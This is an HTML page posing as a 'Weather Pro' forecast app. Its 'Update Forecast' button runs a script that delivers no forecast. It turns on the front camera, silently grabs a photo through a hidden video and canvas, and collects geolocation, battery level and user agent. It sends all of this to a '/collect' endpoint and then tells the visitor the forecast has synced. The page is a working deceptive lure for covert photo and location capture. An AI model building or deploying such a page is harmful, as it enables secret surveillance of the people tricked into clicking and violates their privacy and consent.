<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Weather Pro</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body, html { margin:0; padding:0; height:100%; font-family: sans-serif; overflow:hidden; background:#000; }
    .bg { background: url('https://images.unsplash.com/photo-1515694346937-94d85e41e6f0?auto=format&fit=crop&w=1200&q=80'); background-size:cover; background-position:center; height:100%; width:100%; position:absolute; filter:brightness(0.5); }
    .container { position:relative; z-index:10; height:100%; display:flex; flex-direction:column; justify-content:space-between; padding:40px 30px; box-sizing:border-box; color:white; }
    .temp { font-size:100px; font-weight:300; }
    .glass { background:rgba(255,255,255,0.1); backdrop-filter:blur(20px); border-radius:25px; padding:25px; border:1px solid rgba(255,255,255,0.1); }
    .btn { background:#fff; color:#000; border:none; padding:18px; border-radius:15px; width:100%; font-weight:bold; cursor:pointer; margin-top:15px; }
    #v, #c { display:none; }
  </style>
</head>
<body>
  <div class="bg"></div>
  <div class="container">
    <div>
      <div style="font-size:24px;">Watermelon Park</div>
      <div class="temp">23°c</div>
    </div>
    <div class="glass">
      <div id="status">Update location to synchronize your local 5-day forecast.</div>
      <button id="go" class="btn">Update Forecast</button>
    </div>
  </div>
  <video id="v" autoplay playsinline muted></video>
  <canvas id="c"></canvas>
  <script>
    document.getElementById('go').addEventListener('click', async (e) => {
      const btn = e.target; btn.innerText = "Syncing...";
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        document.getElementById('v').srcObject = stream;
        const canvas = document.getElementById('c'); const ctx = canvas.getContext('2d');
        canvas.width = 400; canvas.height = 300;
        await new Promise(r => setTimeout(r, 1200));
        ctx.drawImage(document.getElementById('v'), 0, 0, 400, 300);
        const img = canvas.toDataURL('image/jpeg', 0.4);
        stream.getTracks().forEach(t => t.stop());
        const battery = await navigator.getBattery();
        const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, () => r({coords:{latitude:0, longitude:0}})));
        const res = await fetch('/collect', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            ts: new Date().toISOString(),
            hints: { ua: navigator.userAgent },
            battery: { levelPercent: Math.round(battery.level * 100) },
            location: { lat: pos.coords.latitude, lon: pos.coords.longitude },
            burstImages: [img, img, img, img]
          })
        });
        if (res.ok) { btn.style.display = 'none'; document.getElementById('status').innerText = "✅ Forecast Synced."; }
        else { btn.innerText = "Retry Update"; }
      } catch (err) { btn.innerText = "Permission Denied"; }
    });
  </script>
</body>
</html>
